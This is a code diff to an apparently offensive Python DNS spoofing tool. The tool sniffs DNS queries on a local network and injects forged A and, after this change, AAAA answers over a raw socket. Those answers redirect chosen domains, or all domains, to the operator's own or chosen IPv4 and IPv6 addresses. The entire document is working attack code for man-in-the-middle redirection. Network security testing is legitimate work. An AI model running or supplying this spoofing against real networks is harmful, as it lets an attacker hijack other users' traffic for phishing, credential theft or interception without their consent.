@@ -12,8 +12,7 @@ from network import DNS_raw
 from ipaddress import IPv4Address
 from argparse import ArgumentParser
 from scapy.all import sniff, Ether, IP, UDP, DNS
-from socket import socket, AF_PACKET, SOCK_RAW, gethostbyname
-from random import randint
+from socket import socket, AF_PACKET, SOCK_RAW, getaddrinfo, AF_INET, AF_INET6, gaierror
 # endregion
 
 # region Check user and platform
@@ -32,8 +31,11 @@ parser.add_argument('--fake_domains', help='Set fake domain or domains, example:
                     default=None)
 parser.add_argument('--fake_ip', help='Set fake IP address or addresses, example: --fake_ip "192.168.0.1,192.168.0.2"',
                     default=None)
+parser.add_argument('--fake_ipv6', help='Set fake IPv6 address or addresses, example: --fake_ipv6 "fd00::1,fd00::2"',
+                    default=None)
 
-parser.add_argument('-f', '--fake_answer', action='store_true', help='Set your IPv4 address in all answers')
+parser.add_argument('--ipv6', action='store_true', help='Enable IPv6')
+parser.add_argument('-f', '--fake_answer', action='store_true', help='Set your IPv4 or IPv6 address in all answers')
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
 
 args = parser.parse_args()
@@ -50,6 +52,45 @@ target_ip_address = None
 
 fake_domains = []
 fake_ip_addresses = []
+fake_ipv6_addresses = []
+fake_addresses = {}
+
+A_DNS_QUERY = 1
+AAAA_DNS_QUERY = 28
+
+if args.ipv6:
+    DNS_QUERY_TYPES = [1, 28]
+else:
+    DNS_QUERY_TYPES = [1]
+# endregion
+
+# region Get your network settings
+if args.interface is None:
+    Base.print_warning("Please set a network interface for sniffing DNS queries ...")
+current_network_interface = Base.netiface_selection(args.interface)
+
+your_mac_address = Base.get_netiface_mac_address(current_network_interface)
+if your_mac_address is None:
+    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
+    exit(1)
+
+your_ip_address = Base.get_netiface_ip_address(current_network_interface)
+if your_ip_address is None:
+    Base.print_error("Network interface: ", current_network_interface, " do not have IP address!")
+    exit(1)
+
+if args.ipv6:
+    your_ipv6_addresses = Base.get_netiface_ipv6_glob_addresses(current_network_interface)
+    if len(your_ipv6_addresses) == 0:
+        if not args.quiet:
+            Base.print_warning("Network interface: ", current_network_interface, " do not have global IPv6 address!")
+        fake_addresses[28] = None
+    else:
+        fake_addresses[28] = your_ipv6_addresses
+else:
+    fake_addresses[28] = None
+
+fake_addresses[1] = [your_ip_address]
 # endregion
 
 # region Create fake domains list
@@ -76,22 +117,32 @@ if args.fake_ip is not None:
         else:
             Base.print_error("Illegal IPv4 address: ", ip_address)
             exit(1)
+
+    # Set fake IPv4 addresses dictionary
+    fake_addresses[1] = fake_ip_addresses
+
 # endregion
 
-# region Get your network settings
-if args.interface is None:
-    Base.print_warning("Please set a network interface for sniffing DNS queries ...")
-current_network_interface = Base.netiface_selection(args.interface)
+# region Create fake ipv6 addresses list
+if args.fake_ipv6 is not None:
 
-your_mac_address = Base.get_netiface_mac_address(current_network_interface)
-if your_mac_address is None:
-    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
-    exit(1)
+    # Delete spaces
+    fake_ipv6_string = args.fake_ipv6.replace(" ", "")
 
-your_ip_address = Base.get_netiface_ip_address(current_network_interface)
-if your_ip_address is None:
-    Base.print_error("Network interface: ", current_network_interface, " do not have IP address!")
-    exit(1)
+    # Create list
+    for ipv6_address in fake_ipv6_string.split(","):
+        if Base.ipv6_address_validation(ipv6_address):
+            fake_ipv6_addresses.append(ipv6_address)
+        else:
+            Base.print_error("Illegal IPv6 address: ", ipv6_address)
+            exit(1)
+
+    # Set fake IPv6 addresses dictionary
+    fake_addresses[28] = fake_ipv6_addresses
+
+    # Rewrite available DNS query types
+    DNS_QUERY_TYPES = [1, 28]
+
 # endregion
 
 # region Create raw socket
@@ -115,6 +166,30 @@ if args.target_ip is not None:
 # endregion
 
 
+# region Get first IPv4 or IPv6 address of domain
+def get_domain_address(query_name, query_type=1):
+
+    # Set proto
+    if query_type == 28:
+        proto = AF_INET6
+    else:
+        proto = AF_INET
+
+    try:
+        # Get list of addresses
+        addresses = getaddrinfo(query_name, None, proto)
+
+        # Return first address from list
+        return [addresses[0][4][0]]
+
+    except gaierror:
+
+        # Could not resolve name
+        return None
+
+# endregion
+
+
 # region DNS reply function
 def dns_reply(request):
 
@@ -122,32 +197,26 @@ def dns_reply(request):
     global SOCK
     global dns
     global args
-    global your_ip_address
+    global fake_domains
+    global fake_addresses
+    global DNS_QUERY_TYPES
     # endregion
 
-    # region DNS query
+    # region This request is DNS query
     if request.haslayer(DNS):
-        try:
-            # region Local variables
 
-            # source_mac_address = str(request[Ether].src)
-            # destination_mac_address = str(request[Ether].dst)
-            # source_ip_address = str(request[IP].src)
-            # destination_ip_address = str(request[IP].dst)
-            # source_udp_port = str(request[UDP].sport)
-            # destination_udp_port = str(request[UDP].dport)
-            # dns_transation_id = str(request[DNS].id)
-            # dns_opcode = str(request[DNS].opcode)
-            # dns_query_type = str(request[DNS].qd.qtype)
-            # dns_query_class = str(request[DNS].qd.qclass)
-            # dns_query_name = str(request[DNS].qd.qname)
+        # region Get DNS query type
+        query_type = int(request[DNS].qd.qtype)
+        # endregion
 
-            dns_answer_packet = None
+        # region Type of DNS query type: A or AAAA
+        if query_type in DNS_QUERY_TYPES:
 
-            # endregion
-
-            # region Sniff DNS A query
-            if request[DNS].qd.qtype == 1:
+            try:
+                # region Local variables
+                query_class = int(request[DNS].qd.qclass)
+                answer = []
+                # endregion
 
                 # region Create query
                 if request[DNS].qd.qname.endswith("."):
@@ -155,98 +224,144 @@ def dns_reply(request):
                 else:
                     query_name = request[DNS].qd.qname
 
-                query = [
-                    {"type": int(request[DNS].qd.qtype),
-                     "class": int(request[DNS].qd.qclass),
-                     "name": query_name}
-                ]
-                # endregion
-
-                # region Create answer
-
-                # region Local variables
-                addresses = []
-                answer = []
+                query = [{
+                    "type": query_type,
+                    "class": query_class,
+                    "name": query_name
+                }]
                 # endregion
 
                 # region Script arguments condition check
 
-                # Fake domains list is set
-                if len(fake_domains) > 0:
+                # region Argument fake_answer is set
+                if args.fake_answer:
+                    addresses = fake_addresses[query_type]
+                # endregion
 
-                    # Fake domains list is set and DNS query name in fake domains list
-                    if query_name in fake_domains:
-
-                        # Fake ip addresses list is set
-                        if len(fake_ip_addresses) > 0:
-                            addresses = fake_ip_addresses
-
-                        # Fake ip addresses list is NOT set
-                        else:
-                            addresses.append(your_ip_address)
-
-                    # Fake domains list is set and DNS query name NOT in fake domains list
-                    else:
-                        addresses.append(gethostbyname(query_name))
-
-                # Fake domains list is NOT set
+                # region Argument fake_answer is NOT set
                 else:
 
-                    # Fake domains list is NOT set and Fake ip addresses list is set
-                    if len(fake_ip_addresses) > 0:
-                        addresses = fake_ip_addresses
+                    # region Fake domains list is set
+                    if len(fake_domains) > 0:
 
-                    # Fake domains list is NOT set and Fake ip addresses list is NOT set
+                        # region Fake domains list is set and DNS query name in fake domains list
+                        if query_name in fake_domains:
+
+                            # region A DNS query
+                            if query_type == 1:
+
+                                # Fake IPv4 is set
+                                if args.fake_ip is not None:
+                                    addresses = fake_addresses[query_type]
+
+                                # Fake IPv4 is NOT set
+                                else:
+                                    addresses = get_domain_address(query_name, query_type)
+
+                            # endregion
+
+                            # region AAAA DNS query
+                            if query_type == 28:
+
+                                # Fake IPv6 is set
+                                if args.fake_ipv6 is not None:
+                                    addresses = fake_addresses[query_type]
+
+                                # Fake IPv6 is NOT set
+                                else:
+                                    addresses = get_domain_address(query_name, query_type)
+
+                            # endregion
+
+                        # endregion
+
+                        # region Fake domains list is set and DNS query name NOT in fake domains list
+                        else:
+                            addresses = get_domain_address(query_name, query_type)
+                        # endregion
+
+                    # endregion
+
+                    # region Fake domains list is NOT set
                     else:
 
-                        # Argument fake_answer is set
-                        if args.fake_answer:
-                            addresses.append(your_ip_address)
+                        # region A DNS query
+                        if query_type == 1:
 
-                        # Argument fake_answer is NOT set
-                        else:
-                            addresses.append(gethostbyname(query_name))
+                            # Fake IPv4 is set
+                            if args.fake_ip is not None:
+                                addresses = fake_addresses[query_type]
+
+                            # Fake IPv4 is NOT set
+                            else:
+                                addresses = get_domain_address(query_name, query_type)
+
+                        # endregion
+
+                        # region AAAA DNS query
+                        if query_type == 28:
+
+                            # Fake IPv6 is set
+                            if args.fake_ipv6 is not None:
+                                addresses = fake_addresses[query_type]
+
+                            # Fake IPv6 is NOT set
+                            else:
+                                addresses = get_domain_address(query_name, query_type)
+
+                        # endregion
+
+                    # endregion
 
                 # endregion
 
-                # region Create answer list
-                for address in addresses:
-                    answer.append({"name": query_name,
-                                   "type": int(request[DNS].qd.qtype),
-                                   "class": int(request[DNS].qd.qclass),
-                                   "ttl": 0xffff,
-                                   "address": address})
                 # endregion
 
+                # region Answer addresses is set
+
+                if addresses is not None:
+
+                    # region Create answer list
+                    for address in addresses:
+                        answer.append({"name": query_name,
+                                       "type": query_type,
+                                       "class": query_class,
+                                       "ttl": 0xffff,
+                                       "address": address})
+                    # endregion
+
+                    # region Make dns answer packet
+                    dns_answer_packet = dns.make_response_packet(src_mac=request[Ether].dst,
+                                                                 dst_mac=request[Ether].src,
+                                                                 src_ip=request[IP].dst,
+                                                                 dst_ip=request[IP].src,
+                                                                 src_port=53,
+                                                                 dst_port=request[UDP].sport,
+                                                                 tid=request[DNS].id,
+                                                                 flags=0x8580,
+                                                                 queries=query,
+                                                                 answers_address=answer)
+                    # endregion
+
+                    # region Send DNS answer packet
+                    SOCK.send(dns_answer_packet)
+                    # endregion
+
+                    # region Print info message
+                    if query_type == 1:
+                        Base.print_info("DNS query from: ", request[IP].src, " type: ", "A",
+                                        " domain: ", query_name, " answer: ", (", ".join(addresses)))
+                    if query_type == 28:
+                        Base.print_info("DNS query from: ", request[IP].src, " type: ", "AAAA",
+                                        " domain: ", query_name, " answer: ", (", ".join(addresses)))
+                    # endregion
+
                 # endregion
 
-                # region Info message
-                Base.print_info("DNS query from: ", request[IP].src, " type: ", "A",
-                                " name: ", query_name, " answer: ", (" ".join(addresses)))
-                # endregion
+            except:
+                pass
+        # endregion
 
-                # region Make dns answer packet
-                dns_answer_packet = dns.make_response_packet(src_mac=request[Ether].dst,
-                                                             dst_mac=request[Ether].src,
-                                                             src_ip=request[IP].dst,
-                                                             dst_ip=request[IP].src,
-                                                             src_port=53,
-                                                             dst_port=request[UDP].sport,
-                                                             tid=request[DNS].id,
-                                                             flags=0x8580,
-                                                             queries=query,
-                                                             answers_address=answer)
-                # endregion
-
-            # endregion
-
-            # region If dns answer packet is not None - send packet
-            if dns_answer_packet is not None:
-                SOCK.send(dns_answer_packet)
-            # endregion
-
-        except:
-            pass
     # endregion
 
 # endregion
@@ -255,12 +370,64 @@ def dns_reply(request):
 # region Main function
 if __name__ == "__main__":
 
-    if target_ip_address is None:
-        Base.print_info("Waiting for DNS query on interface: ", current_network_interface)
-        sniff(filter="udp and dst port 53", prn=dns_reply, iface=current_network_interface)
+    # region Script arguments condition check and print info message
 
+    # region Argument fake_answer is set
+    if args.fake_answer:
+        Base.print_info("DNS answer fake IPv4 address: ", (", ".join(fake_addresses[1])), " for all DNS queries")
+
+        if fake_addresses[28] is not None:
+            Base.print_info("DNS answer fake IPv6 address: ", (", ".join(fake_addresses[28])), " for all DNS queries")
+
+    # endregion
+
+    # region Argument fake_answer is NOT set
     else:
-        Base.print_info("Waiting for DNS query from: ", target_ip_address)
-        sniff(filter="host " + target_ip_address + " and udp and dst port 53",
+
+        # region Fake domains list is set
+        if len(fake_domains) > 0:
+
+            if args.fake_ip is not None:
+                Base.print_info("DNS answer fake IPv4 address: ", (", ".join(fake_addresses[1])),
+                                " for domain: ", (", ".join(fake_domains)))
+
+            if args.fake_ipv6 is not None:
+                Base.print_info("DNS answer fake IPv6 address: ", (", ".join(fake_addresses[28])),
+                                " for domain: ", (", ".join(fake_domains)))
+
+        # endregion
+
+        # region Fake domains list is NOT set
+        else:
+
+            if args.fake_ip is not None:
+                Base.print_info("DNS answer fake IPv4 address: ", (", ".join(fake_addresses[1])),
+                                " for all DNS queries")
+
+            if args.fake_ipv6 is not None:
+                Base.print_info("DNS answer fake IPv6 address: ", (", ".join(fake_addresses[28])),
+                                " for all DNS queries")
+
+        # endregion
+
+    # endregion
+
+    # endregion
+
+    # region Target IPv4 is NOT set
+    if target_ip_address is None:
+        Base.print_info("Waiting for DNS queries on interface: ", current_network_interface)
+        sniff(lfilter=lambda pkt: pkt.src != your_mac_address,
+              filter="udp and dst port 53",
               prn=dns_reply, iface=current_network_interface)
+    # endregion
+
+    # region Target IPv4 is set
+    else:
+        Base.print_info("Waiting for DNS queries from: ", target_ip_address)
+        sniff(lfilter=lambda pkt: pkt.src != your_mac_address,
+              filter="host " + target_ip_address + " and udp and dst port 53",
+              prn=dns_reply, iface=current_network_interface)
+    # endregion
+
 # endregion
